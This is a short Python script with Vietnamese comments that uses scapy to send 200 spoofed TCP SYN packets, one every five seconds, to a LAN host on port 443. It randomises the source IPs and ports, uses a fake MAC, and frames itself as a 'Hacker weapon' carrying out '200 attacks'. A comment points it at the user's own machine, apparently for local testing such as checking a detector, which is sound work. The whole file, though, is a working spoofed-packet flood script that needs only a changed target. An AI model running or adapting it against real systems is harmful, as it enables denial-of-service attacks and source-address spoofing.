from scapy.all import Ether, IP, TCP, sendp, conf
import time
import random

# Đặt IP đích là IP LAN của máy bạn
TARGET_IP = "192.168.2.147" 
TARGET_PORT = 443

print(f"🚀 Kích hoạt vũ khí Hacker [CHẾ ĐỘ RẢI RÁC - 5s/lần]: Bắn SYN vào {TARGET_IP}...")

card_mang = conf.iface
print(f"📡 Đang ép xung qua Card mạng vật lý: {card_mang.name}")

# Tổng cộng 200 cuộc tấn công
for i in range(200):
    fake_ip = f"192.168.2.{random.randint(1, 254)}"
    fake_port = random.randint(1024, 65535)
    
    fake_mac = "02:00:00:00:00:00" 
    broadcast_mac = "ff:ff:ff:ff:ff:ff"
    
    packet = Ether(src=fake_mac, dst=broadcast_mac) / IP(src=fake_ip, dst=TARGET_IP) / TCP(sport=fake_port, dport=TARGET_PORT, flags="S")
    
    # Ép bắn ở Tầng 2
    sendp(packet, iface=card_mang, verbose=False)
    
    print(f" ☠️ [{i+1}/200] Đã bắn SYN từ IP: {fake_ip}:{fake_port}")
    
    # [ĐÃ ĐIỀU CHỈNH]: Dừng đúng 5 giây trước khi bắn phát tiếp theo
    if i < 199:
        time.sleep(5) 

print("✅ Đã hoàn thành toàn bộ 200 cuộc tấn công!")